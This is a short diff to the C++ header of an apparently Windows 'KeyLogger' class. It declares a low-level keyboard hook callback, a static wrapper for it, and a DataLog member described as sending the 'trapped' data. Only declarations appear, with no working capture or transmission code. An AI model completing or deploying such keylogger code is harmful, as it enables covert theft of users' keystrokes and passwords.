@@ -38,15 +38,29 @@ public:
          */
        void hookIt(void);
        
+       /**
+         * Actuall callback function for keyboard hook
+         */
        LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam );
+       
+       /**
+         * Wrapper for callback function (keyboard hook)
+         * necissary for non-static function
+         */
+       static LRESULT CALLBACK LowLevelKeyboardProcWrapper( int nCode, WPARAM wParam, LPARAM lParam );
+       
        
 private:
         /**
           * DataLog object, to send data that is trapped
           */
         DataLog *datalog;
+        
+        /**
+          * Pointer to KeyLogger object (necissary for callback function)
+          */
+        static KeyLogger *objPointer;
 };
-
 
 #define KEYLOGGER_H
 #endif
